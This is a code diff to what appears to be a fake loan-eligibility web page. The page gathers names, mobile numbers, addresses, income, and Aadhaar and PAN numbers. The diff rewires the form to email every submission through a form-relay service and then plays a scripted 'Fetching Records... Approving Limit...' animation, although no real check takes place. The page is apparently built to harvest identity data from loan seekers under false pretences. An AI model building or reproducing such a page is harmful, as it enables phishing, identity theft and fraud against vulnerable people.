@@ -106,8 +106,9 @@
     <div class="container">
         <h2>Personal Details</h2>
 
-        <form id="loanForm">
+        <form id="loanForm" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="fea091d8-a631-4425-aff6-82815670893b">
+            <input type="hidden" name="redirect" value="https://rdxffac-rgb.github.io/?status=success">
             
             <div style="display: flex; gap: 10px;">
                 <div class="form-group" style="flex: 1;">
@@ -140,12 +141,13 @@
                     <option value="">-- Choose State --</option>
                     <option value="Andhra Pradesh">Andhra Pradesh</option><option value="Bihar">Bihar</option><option value="Delhi">Delhi</option><option value="Gujarat">Gujarat</option><option value="Haryana">Haryana</option><option value="Maharashtra">Maharashtra</option><option value="Punjab">Punjab</option><option value="Rajasthan">Rajasthan</option><option value="Uttar Pradesh">Uttar Pradesh</option><option value="West Bengal">West Bengal</option>
                     <option value="Karnataka">Karnataka</option><option value="Kerala">Kerala</option><option value="Tamil Nadu">Tamil Nadu</option><option value="Telangana">Telangana</option>
-                    </select>
+                    <option value="Assam">Assam</option><option value="Madhya Pradesh">Madhya Pradesh</option>
+                </select>
             </div>
 
             <div class="form-group">
                 <label>Address Line 1</label>
-                <input type="text" name="Address_1" id="address1" placeholder="House/Street/Mohalla" required>
+                <input type="text" name="Address_1" id="address1" placeholder="House/Street" required>
             </div>
 
             <div class="form-group">
@@ -217,18 +219,19 @@
                 <label style="font-weight: normal; font-size: 9pt;">I confirm that all details are accurate.</label>
             </div>
 
-            <button type="button" id="submit-btn" onclick="handleSubmit()">Check Eligibility</button>
+            <button type="submit" id="submit-btn">Check Eligibility</button>
         </form>
     </div>
 
     <div id="loader-overlay">
         <div class="spinner"></div>
-        <div id="loader-text">Analyzing profile...</div>
+        <div id="loader-text">Analyzing your profile...</div>
     </div>
 
     <script>
         let selectedGender = '', selectedEmp = '';
 
+        // Standard Banking Validations
         const d = [[0,1,2,3,4,5,6,7,8,9],[1,2,3,4,0,6,7,8,9,5],[2,3,4,0,1,7,8,9,5,6],[3,4,0,1,2,8,9,5,6,7],[4,0,1,2,3,9,5,6,7,8],[5,9,8,7,6,0,4,3,2,1],[6,5,9,8,7,1,0,4,3,2],[7,6,5,9,8,2,1,0,4,3],[8,7,6,5,9,3,2,1,0,4],[9,8,7,6,5,4,3,2,1,0]];
         const p = [[0,1,2,3,4,5,6,7,8,9],[1,5,7,6,2,8,3,0,9,4],[5,8,0,3,7,9,6,1,4,2],[8,9,1,6,0,4,3,5,2,7],[9,4,5,3,1,2,6,8,7,0],[4,2,8,6,5,7,3,9,0,1],[2,7,9,3,8,0,6,4,1,5],[7,0,4,6,9,1,3,2,5,8]];
 
@@ -268,8 +271,6 @@
 
             const isReady = document.getElementById('first-name').value.length >= 2 &&
                             document.getElementById('mobile').value.length === 10 &&
-                            document.getElementById('pincode').value.length === 6 &&
-                            document.getElementById('state-select').value !== "" &&
                             isAdhOk && isPanOk && isIncOk && isAmtOk && selectedGender && selectedEmp && chk;
 
             const btn = document.getElementById('submit-btn');
@@ -277,30 +278,29 @@
             return isReady;
         }
 
-        async function handleSubmit() {
-            if(!validateForm()) return;
-            const overlay = document.getElementById('loader-overlay');
-            const text = document.getElementById('loader-text');
-            overlay.style.display = 'flex';
+        // Check if user is returning from a successful submission
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('status') === 'success') {
+                // Recover data from storage if needed and show animation
+                document.getElementById('loader-overlay').style.display = 'flex';
+                const text = document.getElementById('loader-text');
+                const steps = ["Securing Data...", "Fetching Records...", "Approving Limit..."];
+                let i = 0;
+                const interval = setInterval(() => {
+                    if(i < steps.length) text.innerText = steps[i++];
+                    else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
+                }, 2500);
+            }
+        };
 
+        // Before form submits, save Name and Amount for next page
+        document.getElementById('loanForm').onsubmit = function() {
+            if(!validateForm()) return false;
             localStorage.setItem('userName', document.getElementById('first-name').value + " " + document.getElementById('last-name').value);
             localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
-
-            const formData = new FormData(document.getElementById('loanForm'));
-            
-            // Flex logic: Try sending email, but don't block if response is slow
-            try {
-                fetch("https://api.web3forms.com/submit", { method: "POST", body: formData });
-            } catch(e) {}
-
-            // Immediate UI animation
-            const steps = ["Securing Data...", "Fetching Bureau Records...", "Verifying Address...", "Finalizing Limit..."];
-            let i = 0;
-            const interval = setInterval(() => {
-                if(i < steps.length) text.innerText = steps[i++];
-                else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
-            }, 3000);
-        }
+            return true;
+        };
 
         document.querySelectorAll('input, select, #agree').forEach(el => {
             el.addEventListener('input', validateForm);
